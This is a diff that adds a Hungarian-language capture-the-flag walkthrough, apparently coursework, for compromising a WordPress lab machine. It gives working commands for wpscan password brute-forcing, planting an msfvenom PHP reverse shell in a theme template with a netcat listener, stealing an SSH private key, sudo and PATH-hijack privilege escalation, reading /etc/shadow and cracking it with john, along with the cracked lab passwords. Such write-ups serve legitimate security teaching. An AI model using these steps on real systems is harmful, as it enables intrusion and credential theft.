@@ -1,0 +1,54 @@
+Githubomon van fenn egy puska: https://github.com/Cscsabi/CheatSheet
+Innen írtam az egészet.
+
+Az első lépés ugye az volt, hogy nmap-el megnéztük az ip-t, majd láttuk, hogy van weboldala. A weboldal forrásában kicsit turkálva megtudtuk, hogy wordpresses az oldal, tehát könnyen el lehetett jutni a /wp-admin oldalra. Ezután jöhetett a dirb vagy a gobuster, ez is megtalálja a wp-admin oldalt. Mivel wordpresses az oldal, ezért a wpscan egy kézenfekvő megoldás.
+
+Először a felhasználókat kellett megtalálni: wpscan --url http://IP_CIM --enumerate u 
+Ezzel megtaláltuk, hogy van Flaghasználó, nagyontitkos és hallgató felhasználó.
+A hallgatót nem támadtam, mert a tippben benne volt, hogy nem érdemes, a flaghasználónál sem találtam jelszót, viszont a nagyontitkos felhasználó jelszavát hamar megtalálta a wpscan a következő paranccsal: 
+wpscan --url http://IP_CIM --usernames nagyontitkos --passwords /usr/share/wordlists/rockyou.txt
+A jelszó: froggy
+Innentől be tudtunk lépni a weboldalra. Az első flaget a felhasználók között találtuk: A Felhasznalók fül alatt a flaghasználó nevére kattintva és kicsit lejjebb görgetve láttuk az első flaget.
+
+Wordpress oldalnál tanultuk, hogy Appearance -> Editor fül alatt találjuk a page template-eket, itt módosítottam a 404.php templatet. Generáltam egy php_reverse shellt a következő paranccsal:
+msfvenom -p php/reverse_shell LHOST=A_TE_IPD RHOST=A_TAMADOTT_IP LPORT=5555 -f raw > revshell.php
+Ezt a generált reverse_shellt bemásoltam a 404.php-ba, elmentettem, majd készítettem a kali gépen egy netcat listenert: nc -lvnp 5555
+Ezután annyit kellett tennem, hogy rákeresek egy olyan oldalra, ami nem létezik, és kapok egy shellt a kalin. Pl.: http://IP_CIM/tutinemletezik
+
+Ekkor a www-data felhasználóként kaptam shellt. A hallgatóba kellett valahogy átjutni, ehhez beléptem a hallgató home mappájába (/home/hallgato), majd itt kilistáztam minden file-t: ls -al. Láttam, hogy van egy rejtett .ssh mappa, ebbe beleléptem és kiírtam (cat) a privát kulcsot. Ezt átmásoltam egy fileba (pl.: egy privatkulcs nevű fájlba) a saját gépemen és innentől fogva be tudtam ssh-zni a hallgató felhasználóba:
+ssh -i privatkulcs hallgato@IP_CIM
+Bent is vagyok a hallgato felhasználóban, a második flag a hallgato home mappájában volt: (/home/hallgato/flag1.txt).
+
+A home mappában 4 felhasználónak van mappája: katherine, juliet, hallgato, meg egy másik, amit nem kell bántani. Minden mappában van egy flag, és az utolsó flag a /root mappában van.
+Mivel újabb felhasználóba kerültünk, érdemes megnézni, hogy mihez van jogunk. A sudo -l paranccsal kilistázzuk, hogy mit tehet a hallgato felhasználó, itt pedig láttuk, hogy sudo jogunk van egy bizonyos "awk" parancshoz. 
+Ezt a parancsot kikeressük a https://gtfobins.github.io/ oldalról, ahol látjuk, hogy lehet vele jogokat szerezni, ezt ki tudjuk haszálni. A Sudo fül alatt az oldalon olvashatjuk a következő parancsot: 
+sudo awk 'BEGIN {system("/bin/sh")}', itt érdemes bash-t használni, hogy szebb shellt kapjunk: sudo awk 'BEGIN {system("/bin/bash")}'.
+Így átkerültünk a juliet felhasználóba. A /home/juliet/flag2.txt-ből kiolvassuk a harmadik flag-et.
+
+Ismét új felhasználóba kerültünk, viszont a sudo -l parancs nem hoz kihasználható eredményeket, máshol kell keresgélnünk. Megnézzük, hogy vannak e kihasználható SUID bitek vagy Capability-k: 
+SUID: find / -perm /u=s 2>/dev/null
+Capabilities: getcap -r / 2>/dev/null
+A capabilities nem hoz kihasználható eredményt, viszont a /home/juliet mappában van egy SUID bittel ellátott file: users. 
+Ha ezt futtatjuk és kicsit megvizsgáljuk, akkor látszik, hogy a file egy "w" nevű fájlt olvas be (első sorból olvasható ki).
+Itt jön képbe a PATH hijacking. Csinálunk egy "w" nevű fájlt a következő tartalommal: 
+"
+#!/bin/bash
+
+bash -i
+"
+Majd ha ez megvan akkor exportáljuk a PATH változóba a következőképpen:
+export PATH=/home/juliet:$PATH
+Így a fájl először itt fogja keresni a "w"-t. Innentől kezdve annyi dolgunk van, hogy futtasuk le: ./users
+Átkerültünk a katherine felhasználóba, így a /home/katherine/flag3.txt-ből kiolvasható a negyedik flag.
+
+Ismét új felhasználóba kerültünk, a sudo -l parancs kimenetéből kiolvashatjuk, hogy sudo jogunk van a bridge parancsra. Ismét: https://gtfobins.github.io/ -en rákeresünk a bridge parancsra. Látjuk, hogy tudunk vele fájlokat olvasni, ezért a /etc/shadow fileból olvassuk ki a root jelszavát:
+LFILE=/etc/shadow
+sudo -u root bridge -b "$LFILE"
+A kimenet egy titkosított jelszó, ezt másoljuk a kali gépre, és törjük fel john-nal.
+Legyen a fájl neve: jelszo.txt
+Ekkor a john parancs a következő:
+john jelszo.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Meg is kaptuk a root jelszavát: diablo
+Átváltunk a root felhasználóra: su
+Beírjuk a jelszót és root-ok lettünk. Innentől mindenhez jogunk van.
+Az utolsó flag a /root/flag4.txt-ből kiolvasható.
